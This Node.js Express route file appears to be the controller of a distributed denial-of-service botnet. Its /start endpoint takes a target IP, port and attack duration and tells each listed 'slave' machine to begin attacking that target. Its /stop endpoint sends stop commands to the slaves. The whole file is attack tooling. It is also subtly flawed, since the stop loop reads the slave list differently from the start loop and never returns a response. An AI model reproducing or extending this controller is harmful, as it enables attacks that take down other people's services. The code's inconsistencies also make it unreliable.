var slaves = require("../config/slaves.js"),
    request = require("request");
module.exports = function(app){
    app.post("/start",function(req,res){
        var prt, slaveSRC, slavePRT, uri;
        var ip = req.body.dstIP;
        var timeForAttack = req.body.ttl;
        if(req.body.hasOwnProperty('prt')){
            prt = req.body.prt;
        }else{
            prt = 80;
        }
        slave = slaves.slave;
        for(var i = 0; i < slave.length; i++){
            slaveSRC = slave[i].ip;
            slavePRT = slave[i].prt;
            uri = "http://" + slaveSRC + ":" + slavePRT + "/" + "start";
            console.log(uri);
            request({
                uri: uri,
                method: "POST",
                form : {
                    ip: ip,
                    prt: prt,
                    ttl: timeForAttack
                }
            }, function(error,response,body){
                if(error){
                    console.log(error);
                }
            })
        }
        res.json({});
    })
    app.get("/stop",function(req,res){
        var slaveSRC, slavePRT;
        console.log(slaves);
        for(var i = 0; i < slaves.length; i++){
            slaveSRC = slaves[i].ip;
            slavePRT = slaves[i].prt;
            uri = "http://" + slaveSRC + ":" + slavePRT + "/" + "stop";
            request({
                uri: uri,
                method: "GET",
            }, function(error,response,body){

            })

        }
    })
}
